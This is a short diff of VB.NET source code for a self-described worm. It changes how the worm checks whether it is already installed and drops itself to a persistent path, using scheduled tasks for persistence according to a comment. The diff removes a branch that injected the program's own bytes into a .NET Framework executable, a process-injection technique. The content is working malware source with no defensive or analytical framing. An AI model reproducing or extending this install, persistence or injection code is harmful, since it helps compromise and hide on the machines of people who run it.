@@ -6,7 +6,7 @@
         'Using schtasks instead of reg and startup folder
 
         If C_Settings.DROP Then
-            If Application.ExecutablePath <> C_Settings.fullpath AndAlso IO.Path.GetFileName(Application.ExecutablePath) <> C_Settings.INJ_Name Then 'Checking if worm is already installed
+            If Application.ExecutablePath <> C_Settings.fullpath Then 'Checking if worm is already installed
 
                 'Worm not installed// begin installing
                 Try
@@ -30,14 +30,8 @@
                     End ' Close this application because fullpath will be started
                 Catch ex As Exception
                 End Try
-
-            ElseIf Application.ExecutablePath = C_Settings.fullpath AndAlso C_Settings.INJ_CHK = True AndAlso IO.Path.GetFileName(Application.ExecutablePath.ToLower) <> C_Settings.INJ_Name.ToLower Then
-                Try
-                    S_Inject.injRun("\Windows\Microsoft.NET\Framework\v2.0.50727\" & C_Settings.INJ_Name, String.Empty, IO.File.ReadAllBytes(Application.ExecutablePath), True)
-                    End
-                Catch ex As Exception
-                End Try
             End If
+
         Else
             C_Settings.fullpath = Application.ExecutablePath 'drop false
         End If
